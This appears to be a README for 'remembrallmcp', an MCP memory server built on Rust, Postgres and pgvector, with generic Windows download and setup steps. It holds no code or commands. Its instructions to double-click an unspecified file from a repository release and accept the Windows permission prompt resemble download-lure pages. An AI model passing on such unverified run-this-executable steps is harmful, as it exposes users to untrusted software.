# 🧠 remembrallmcp - Keep AI Memory in One Place

[![Download / Install](https://img.shields.io/badge/Download%20from%20GitHub-blue?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Alicsealed322/remembrallmcp)

## 🧩 What this does

remembrallmcp is a memory layer for AI tools and agents. It helps store useful facts, past work, and project context in one place so the assistant can find them again later.

It uses:
- Rust for fast local performance
- Postgres for storage
- pgvector for semantic search
- MCP for tool access from AI apps

This can help keep AI responses more consistent when you work on the same project over time.

## 📥 Download and run on Windows

Use this link to visit the download page:

[Open the GitHub page](https://github.com/Alicsealed322/remembrallmcp)

On Windows, the usual flow is:

1. Open the link above
2. Download the latest release or package from the repository page
3. If you get a `.zip` file, right-click it and choose **Extract All**
4. Open the extracted folder
5. Find the app file or setup file
6. Double-click it to run

If Windows asks for permission, choose **Yes** to continue.

If the app starts in a console window, leave that window open while you use the tool.

## 🖥️ What you need

For a smooth setup on Windows, use:

- Windows 10 or Windows 11
- A stable internet connection
- At least 4 GB of RAM
- Enough free disk space for the app and your data
- A running Postgres database with pgvector support

If you plan to use it with an AI app, you also need that app set up on your computer.

## 🔧 How it works

remembrallmcp stores memory items in a database. Each item can include:
- a note
- a project fact
- a decision
- a code detail
- a search tag

When the AI needs context, it can look up related items by meaning, not just by exact words. That makes it easier to find the right memory even if the wording is different.

## ⚙️ Basic setup

Follow these steps after you download the app from the GitHub page:

1. Open your Postgres database
2. Make sure the `pgvector` extension is turned on
3. Start the remembrallmcp app
4. Connect the app to your database
5. Add it to your AI tool or MCP client
6. Save a test note and check that it can be found again

If the app has a settings file, open it in Notepad and add the database details there.

Typical values you may need:
- database host
- port
- database name
- user name
- password

## 🗂️ Example use cases

You can use remembrallmcp for:

- remembering project notes across sessions
- storing useful code facts
- saving decisions made during a task
- tracking dependencies between ideas
- keeping a search-friendly record of past work
- helping an AI agent stay focused on one project

It works well when you want your AI tool to remember more than what fits in one chat.

## 🧠 Why it helps

AI tools often forget context when a chat gets long or when you start a new session. This app gives them a place to store that context.

That can help with:
- repeat work
- missed project details
- lost decisions
- inconsistent answers
- extra time spent explaining the same thing again

With a memory layer, the assistant can pull in older facts when they matter.

## 🔍 Search and memory

The app uses semantic search with vectors. In plain terms, this means it can find related items by meaning.

For example:
- “login issue” can match “sign-in problem”
- “database setup” can match “Postgres config”
- “API error” can match “service failure”

This is useful when your notes use different wording from your search.

## 🔗 MCP support

remembrallmcp works through the Model Context Protocol, or MCP. That lets supported AI apps talk to it as a tool.

In simple terms, the AI app can:
- add memory
- search memory
- read stored context
- use stored facts during a task

This makes it easier to connect the memory layer to tools that already support MCP.

## 🧱 Build from source

If you want to build it yourself on Windows:

1. Install Rust
2. Install Postgres
3. Turn on pgvector in your database
4. Download or clone the repository from GitHub
5. Open a terminal in the project folder
6. Run the build command for the project
7. Start the app after the build finishes

A typical Rust build uses `cargo build` or `cargo run`, depending on how the project is set up.

## 🧪 Simple first check

After you run the app, try this:

1. Add one short note
2. Search for a word from that note
3. Confirm that the app returns the right item
4. Open your AI tool and check that it can reach the same memory store

If this works, the app is connected and ready to use.

## 🛠️ Common setup tips

If the app does not start, check these items:

- Postgres is running
- the database name is correct
- the user name and password are correct
- `pgvector` is enabled
- the port is open
- another app is not using the same port

If search results feel weak, add better notes with clear terms and short descriptions.

## 📌 Good ways to use it

To get better results, store memory in small pieces:

- one fact per note
- one decision per entry
- one topic per item
- short labels for projects
- clear names for tools and files

This helps search return the right record with less noise.

## 📚 Topics

This project fits these areas:

- AI agents
- memory
- MCP servers
- Postgres
- pgvector
- semantic search
- knowledge graphs
- code analysis
- dependency graphs
- developer tools
- Rust
- tree-sitter

## 📁 Repository

Use this page to download, inspect, or clone the project:

[https://github.com/Alicsealed322/remembrallmcp](https://github.com/Alicsealed322/remembrallmcp)

## 🧭 Windows run checklist

Before you start the app, check that you have:

- downloaded the project from GitHub
- extracted any `.zip` file
- installed or prepared Postgres
- enabled `pgvector`
- opened the app file
- added your database details
- connected your AI app or MCP client

## 🧰 File types you may see

Depending on how the project is packaged, you may see:

- `.exe` for Windows
- `.zip` for a bundled download
- `.msi` for an installer
- `.toml` or `.json` for config
- `.env` for environment values
- `.md` for project notes

If you see a config file, open it with Notepad and edit only the values you understand.